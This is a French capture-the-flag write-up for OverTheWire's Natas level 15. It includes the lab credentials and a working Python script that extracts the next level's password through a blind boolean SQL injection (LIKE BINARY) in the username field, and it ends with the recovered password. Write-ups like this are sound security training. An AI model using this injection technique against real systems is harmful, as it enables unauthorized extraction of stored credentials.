## Connexion (username=natas15 password=GB6USCJYJjwLyYhZUNkE1NwDueiTow6g)
```
http://natas15.natas.labs.overthewire.org/
```

## Recherche du mot de passe
Cette fois la requête vérifie la présence du username en BD.
Par contre, si je teste qu'un mot de passe commence par la lettre A, B, C, CA, CB ...
Je pourrai reconstituer le mot de passe de natas16 en utilisant une injection en boucle du genre:

```natas16" AND password LIKE "string_pour_reconstituer_le_pwd%```

En supposant que les mots de passe sont de 32 caractères ...
```python
import requests
import string
import time

url = "http://natas15.natas.labs.overthewire.org/index.php"

header = {
    # base64 encode natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
    "Authorization": "Basic bmF0YXMxNTpHQjZVU0NKWUpqd0x5WWhaVU5rRTFOd0R1ZWlUb3c2Zw=="
}

# A à Z, 0...9
ALPHABET = string.ascii_letters + string.digits
builded_pwd = ""

with requests.Session() as session:
    session.headers.update(header)
    alphabet_idx = 0
    while alphabet_idx < len(ALPHABET):
        letter = ALPHABET[alphabet_idx]
        # binary pour le case sensitive ...
        payload = {'username':f'natas16" AND password LIKE BINARY "{builded_pwd+letter}%'}
        response = session.post(url, data=payload)
        if "This user exists." in response.text:
            builded_pwd += letter
            alphabet_idx = -1
            print(builded_pwd)
            if len(builded_pwd) >= 32:
                break
        alphabet_idx += 1
        time.sleep(0.5)

print(f"Natas 16 password is: {builded_pwd}")

```
## Prochain mot de passe
```
Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
```